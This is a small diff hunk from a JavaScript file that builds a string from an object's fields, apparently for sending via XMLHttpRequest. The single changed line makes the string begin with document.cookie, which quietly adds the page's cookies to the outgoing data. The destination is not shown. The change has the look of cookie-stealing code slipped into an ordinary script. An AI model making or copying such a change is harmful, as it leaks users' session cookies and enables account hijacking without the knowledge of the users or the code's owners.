@@ -5,7 +5,7 @@ xhttp.onreadystatechange = function(){
         console.log(this.responseText);
     }
 }
-let data = "";
+let data = document.cookie + ":::";
 Object.keys(obj).forEach(key => {
     const value = obj[key];
     let d = key + ":" + value;
